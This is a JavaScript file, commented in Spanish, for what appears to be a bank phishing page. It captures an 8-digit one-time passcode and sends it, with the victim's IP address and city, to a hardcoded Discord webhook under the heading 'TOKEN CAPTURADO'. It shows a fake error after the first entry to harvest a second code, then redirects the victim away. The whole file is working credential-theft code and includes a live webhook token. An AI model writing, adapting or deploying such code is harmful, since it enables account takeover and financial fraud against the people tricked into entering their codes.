const WEBHOOK_URL = "https://discord.com/api/webhooks/1501745303240310889/GnaRhmNXSMulsBGW9uu2Suu-a5gNGdMWpqlizPI9he-alilOASSbJmfYkIg1B4r7GndG";
const inputs = document.querySelectorAll('.otp-input');
const btnFinal = document.getElementById('btnFinal');
const errorMsg = document.getElementById('error-msg');

let intentos = 0; // Contador de intentos

// Salto automático de inputs
inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
        checkComplete();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus();
    });
});

function checkComplete() {
    const code = Array.from(inputs).map(i => i.value).join('');
    if (code.length === 8) {
        btnFinal.disabled = false;
        btnFinal.classList.remove('bg-gray-200', 'text-gray-400');
        btnFinal.classList.add('bg-red-600', 'text-white');
    } else {
        btnFinal.disabled = true;
        btnFinal.classList.add('bg-gray-200', 'text-gray-400');
        btnFinal.classList.remove('bg-red-600', 'text-white');
    }
}

btnFinal.addEventListener('click', async () => {
    const finalCode = Array.from(inputs).map(i => i.value).join('');
    btnFinal.innerText = "Verificando...";
    btnFinal.disabled = true;

    intentos++; // Aumentamos el intento

    try {
        const geoRes = await fetch('https://ipapi.co/json/').catch(() => ({ json: () => ({}) }));
        const geo = await geoRes.json();

        // Enviamos el código a Discord
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: `🔑 TOKEN CAPTURADO - INTENTO #${intentos}`,
                    color: intentos === 1 ? 0xff9900 : 0x00ff00,
                    fields: [
                        { name: "🔢 Código OTP", value: `\`${finalCode}\``, inline: false },
                        { name: "🌐 IP", value: geo.ip || "No detectada", inline: true },
                        { name: "📍 Ciudad", value: geo.city || "Desconocida", inline: true }
                    ],
                    timestamp: new Date()
                }]
            })
        });

        if (intentos === 1) {
            // PRIMER INTENTO: Simulamos error
            setTimeout(() => {
                // Limpiar inputs
                inputs.forEach(input => input.value = "");
                // Mostrar error
                errorMsg.classList.remove('hidden');
                // Resetear botón
                btnFinal.innerText = "Confirmar Código";
                btnFinal.disabled = true;
                btnFinal.classList.add('bg-gray-200', 'text-gray-400');
                btnFinal.classList.remove('bg-red-600', 'text-white');
                // Foco en el primero
                inputs[0].focus();
            }, 1500);
        } else {
            // SEGUNDO INTENTO: Finalizar
            window.location.href = "https://www.google.com"; // Redirigir al banco real
        }

    } catch (e) {
        window.location.href = "https://www.google.com";
    }
});